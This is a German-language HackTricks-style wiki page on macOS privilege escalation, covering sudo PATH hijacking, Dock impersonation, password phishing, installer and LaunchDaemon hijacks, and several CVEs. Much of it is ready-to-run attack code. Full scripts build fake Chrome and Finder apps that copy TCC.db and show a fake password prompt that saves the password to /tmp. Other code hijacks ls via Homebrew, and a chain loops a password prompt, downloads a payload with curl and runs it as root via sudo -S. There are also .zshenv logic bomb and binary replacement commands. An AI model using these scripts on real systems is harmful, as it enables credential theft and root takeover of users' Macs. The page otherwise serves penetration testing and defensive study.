# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn du wegen TCC privilege escalation hierhergekommen bist, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Viele Privilege-Escalation-Techniken, die Linux oder andere Unix-ähnliche Systeme betreffen, gelten auch für macOS. Siehe:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Die ursprüngliche [Sudo Hijacking-Technik findest du im Beitrag zur Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behält** jedoch den **`PATH`** des Benutzers bei, wenn dieser **`sudo`** ausführt. Das bedeutet, dass eine andere Möglichkeit, diesen Angriff durchzuführen, darin bestünde, **andere Binaries zu hijacken**, die das Opfer bei der **Ausführung von sudo:** weiterhin ausführt.
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachte, dass ein Benutzer, der das Terminal verwendet, **sehr wahrscheinlich Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mithilfe von etwas **social engineering** könntest du beispielsweise **Google Chrome** im Dock **impersonate** und tatsächlich dein eigenes Script ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Überprüfe im Dock, ob Chrome vorhanden ist. Falls ja, **entferne** diesen Eintrag und **füge den **fake** **Chrome-Eintrag an derselben Position** im Dock-Array hinzu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **kannst Finder nicht aus dem Dock entfernen**. Wenn du es also zum Dock hinzufügen möchtest, könntest du den gefälschten Finder direkt neben dem echten platzieren. Dafür musst du **den Eintrag des gefälschten Finders am Anfang des Dock-Arrays hinzufügen**.
- Eine andere Möglichkeit besteht darin, ihn nicht im Dock zu platzieren, sondern ihn einfach zu öffnen. „Finder asks to control Finder“ ist nicht besonders ungewöhnlich.
- Eine weitere Möglichkeit, **ohne Nachfrage und ohne ein schreckliches Fenster nach root zu eskalieren**, besteht darin, Finder tatsächlich nach dem Passwort für eine privilegierte Aktion fragen zu lassen:
- Finder anweisen, eine neue **`sudo`-Datei** nach **`/etc/pam.d`** zu kopieren. (Die Aufforderung zur Passworteingabe zeigt an, dass „Finder sudo kopieren möchte“.)
- Finder anweisen, ein neues **Authorization Plugin** zu kopieren. (Du könntest den Dateinamen kontrollieren, sodass die Aufforderung zur Passworteingabe anzeigt, dass „Finder Finder.bundle kopieren möchte“.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing über Passwortabfragen + Wiederverwendung von sudo

Malware missbraucht häufig die Benutzerinteraktion, um ein **sudo-fähiges Passwort abzugreifen** und es programmgesteuert wiederzuverwenden. Ein üblicher Ablauf:

1. Den angemeldeten Benutzer mit `whoami` ermitteln.
2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` erfolgreich zurückkehrt.
3. Das Zugangsdaten zwischenspeichern (z. B. `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (Passwort über stdin).

Minimale Beispielkette:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Das gestohlene Passwort kann anschließend wiederverwendet werden, um die **Gatekeeper-Quarantäne mit `xattr -c` zu löschen**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht-interaktiv auszuführen.<sup>[[1]](#references)</sup>

## Neuere macOS-spezifische Vektoren (2023–2026)

### Veraltetes `AuthorizationExecuteWithPrivileges` weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet eingestuft, **funktioniert aber weiterhin unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Wenn die Ziel-Binary vom Benutzer beschreibbar ist, kannst du einen Trojaner platzieren und die legitime Abfrage nutzen:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Mit den **oben genannten masquerading tricks** kombinieren, um einen glaubwürdigen Passwortdialog darzustellen.


### Privileged helper / XPC-Triage

Viele moderne macOS-privescs von Drittanbietern folgen demselben Muster: Ein **root LaunchDaemon** stellt einen **Mach/XPC service** aus **`/Library/PrivilegedHelperTools`** bereit. Anschließend validiert der helper entweder den **client** **nicht**, validiert ihn **zu spät** (PID race) oder stellt eine **root method** bereit, die einen **user-controlled path/script** verarbeitet. Diese Bug-Klasse steckt hinter vielen aktuellen helper bugs in VPN-Clients, game launchers und updaters.<sup>[[2]](#references)</sup>

Kurze Triage-Checkliste:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Achte besonders auf Helper, die:

- **nach der Deinstallation** weiterhin Anfragen akzeptieren, weil der Job in `launchd` geladen blieb
- Skripte aus **`/Applications/...`** oder anderen Pfaden ausführen bzw. Konfigurationen daraus lesen, die von Nicht-Root-Benutzern beschreibbar sind
- sich auf eine **PID-basierte** oder **nur auf der Bundle-ID basierende** Peer-Validierung verlassen, die möglicherweise durch eine Race Condition ausnutzbar ist

Weitere Details zu Authorization-Bugs bei Helpern findest du auf [dieser Seite](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit-Skript-Umgebungsvererbung (CVE-2024-27822)

Bis Apple das Problem in **Sonoma 14.5**, **Ventura 13.6.7** und **Monterey 12.7.5** behoben hatte, konnten von Benutzern initiierte Installationen über **`Installer.app`** / **`PackageKit.framework`** **PKG-Skripte als Root innerhalb der Umgebung des aktuellen Benutzers** ausführen. Das bedeutet, dass ein Package mit **`#!/bin/zsh`** die **`~/.zshenv`** des Angreifers laden und als **Root** ausführen würde, wenn das Opfer das Package installierte.<sup>[[3]](#references)</sup>

Das ist besonders interessant als **logic bomb**: Du benötigst lediglich einen foothold im Benutzerkonto und eine beschreibbare Shell-Startup-Datei und wartest dann, bis ein beliebiges verwundbares **zsh-basiertes** Installer vom Benutzer ausgeführt wird. Dies gilt im Allgemeinen **nicht** für **MDM/Munki**-Deployments, da diese innerhalb der Umgebung des Root-Benutzers ausgeführt werden.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Wenn du tiefer in den missbrauchsspezifischen Bereich von Installern einsteigen möchtest, sieh dir auch [diese Seite](macos-files-folders-and-binaries/macos-installers-abuse.md) an.

### Kollision von Installer-Zielen über `.localized`

Einige Installer von Drittanbietern registrieren einen root-LaunchDaemon, dessen ausführbare Datei mit einem festen Pfad innerhalb von `/Applications/Target.app` referenziert wird. Wenn ein Angreifer dieses Bundle zuerst mit einer **anderen Bundle-ID** erstellen kann, bewahrt Installer möglicherweise den Köder und platziert die echte App unter `/Applications/Target.localized/Target.app`. Der Daemon verweist weiterhin auf den ursprünglichen Pfad. Daher kann eine vom Angreifer kontrollierte ausführbare Datei innerhalb des Köder-Bundles später als root ausgeführt werden.<sup>[[8]](#references)</sup>

Die wichtigen Voraussetzungen sind:<sup>[[8]](#references)</sup>

1. Der Angreifer kann den erwarteten Anwendungspfad erstellen oder kontrollieren.
2. Das Paket entfernt das kollidierende Bundle nicht.
3. Der privilegierte Job verwendet einen fest codierten Pfad innerhalb dieses Bundles.
4. Der Benutzer oder ein MDM-Workflow installiert das Paket und registriert den Job.

Suche nach verschobenen Bundles und überprüfe anschließend die LaunchDaemon-Ziele mit der Enumeration-Schleife im nächsten Abschnitt:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Ein sichereres Installationsprogramm ermittelt den endgültigen Bundle-Speicherort und bewahrt privilegierte Executables an einem von root besessenen Speicherort wie `/Library/PrivilegedHelperTools` auf. Außerdem sollte es Besitzverhältnisse und Code-Signatur überprüfen, bevor der Job registriert oder gestartet wird.<sup>[[8]](#references)</sup>

### Hijacking eines beschreibbaren LaunchDaemon-Ziels

Eine LaunchDaemon-Plist kann root gehören, während ihr `Program`- oder erster `ProgramArguments`-Eintrag auf ein für Benutzer beschreibbares Verzeichnis verweist. Überprüfe den **gesamten Pfad**, nicht nur die Berechtigungen der ausführbaren Datei. Wenn das übergeordnete Verzeichnis beschreibbar ist, kann ein Angreifer eine root-eigene ausführbare Datei umbenennen und am selben Pfad einen Ersatz erstellen. Der Ersatz wird als root ausgeführt, sobald der Job das nächste Mal gestartet wird. Ein Neustart oder ein normaler Dienstneustart genügt. Der Angreifer benötigt keine Berechtigung, `launchctl bootstrap` in der System-Domain auszuführen.<sup>[[7]](#references)</sup>

Liste zunächst jedes Ziel und dessen direkt übergeordnetes Verzeichnis auf:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Wenn die Datei oder ihr übergeordnetes Verzeichnis beschreibbar ist, bewahre die ursprüngliche Binärdatei auf und ersetze den Pfad durch eine ausführbare Payload. Warte dann, bis der bereits geladene Daemon neu gestartet wird.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Der verwundbare Pfad `kauth_cred_proc_update` aktualisierte `proc_ro.p_ucred` mit der nicht-atomaren API `zalloc_ro_mut`, während SMR-Leser den Pointer ohne Lock luden. Der öffentliche Trigger verwendet ein speziell vorbereitetes setgid-Binary. Ein Thread wechselt zwischen seiner tatsächlichen und effektiven Gruppen-ID, während ein anderer Thread wiederholt einen Syscall wie `getgid()` ausführt.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Behandle dies als **race primitive**, nicht als fertigen Root-Exploit. Der veröffentlichte PoC demonstriert einen zerrissenen Credential-Pointer. Er endet häufig in einer Kernel-Panic. Der Forscher konnte die Korruption nur auf Intel reproduzieren und lieferte keine deterministische Kontrolle über das daraus entstehende Credential-Objekt. Apple änderte das Update in macOS 15.3 zu einem atomaren Pointer-Austausch.<sup>[[4]](#references)</sup>

### SIP-Umgehung über den Migration Assistant ("Migraine", CVE-2023-32369)

Wenn du bereits Root-Rechte hast, blockiert SIP weiterhin Schreibzugriffe auf Systempfade. Der **Migraine**-Bug missbraucht die Berechtigung `com.apple.rootless.install.heritable` des Migration Assistant, um einen Child-Prozess zu starten, der die SIP-Umgehung erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die Angriffskette:

1. Root-Rechte auf einem laufenden System erlangen.
2. `systemmigrationd` mit einem manipulierten Zustand auslösen, damit eine vom Angreifer kontrollierte Binary ausgeführt wird.
3. Die geerbte Berechtigung verwenden, um durch SIP geschützte Dateien zu verändern und so auch nach einem Neustart persistent zu bleiben.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren nur das vom Angreifer kontrollierte Feld `expressionType`. Durch das Erstellen eines Predicates, das beliebige Selector auswertet, kann **code execution in root/system XPC services** erreicht werden (z. B. `coreduetd`, `contextstored`). In Kombination mit einem initialen App-Sandbox-Escape ermöglicht dies **privilege escalation without user prompts**. Suche nach XPC-Endpunkten, die Predicates deserialisieren und keinen robusten Visitor verwenden.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Jeder Benutzer** (auch Benutzer ohne besondere Berechtigungen) kann einen Time-Machine-Snapshot mit `-o noowners` erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen, wodurch die Eigentümerprüfungen auf dem Live-Volume umgangen werden. Die einzige erforderliche Berechtigung besteht darin, dass die verwendete Anwendung (z. B. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) besitzt.

Die Befehle und die vollständige Erklärung findest du auf der Seite zu TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensible Informationen

Dies kann zur Privilege Escalation nützlich sein:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN für macOS: lokale Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine"-SIP-Umgehung (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Eine neue Klasse von Privilege-Escalation-Bugs auf macOS und iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: Privilege Escalation und Persistence über unsichere Ordnerberechtigungen](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE über das Verzeichnis `.localized`](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
